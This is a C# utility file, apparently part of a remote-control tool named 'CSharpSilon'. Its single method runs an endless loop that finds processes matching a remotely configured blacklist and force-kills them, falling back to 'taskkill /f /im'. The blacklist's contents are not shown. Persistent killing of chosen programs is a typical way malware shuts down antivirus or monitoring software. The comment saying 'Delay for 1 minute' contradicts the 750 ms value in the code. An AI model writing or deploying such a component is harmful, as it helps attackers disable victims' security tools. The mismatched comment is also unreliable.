using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace CSharpSilon.Utils
{
    public class Processes
    {
        public static async Task ManageBlacklistedPrograms()
        {
            while (true)
            {
                foreach (var proc in Process.GetProcesses()
                             .Where(proc => cmds.Processes.BlacklistedPrograms.Any(blacklisted => proc.ProcessName.Equals(blacklisted, StringComparison.OrdinalIgnoreCase))))
                {
                    try { proc.Kill(); }
                    catch { try { App.execute($"taskkill /f /im {proc.ProcessName}.exe"); } catch { } }
                    Thread.Sleep(15);
                }

                await Task.Delay(750); // Delay for 1 minute
            }
        }
    }
}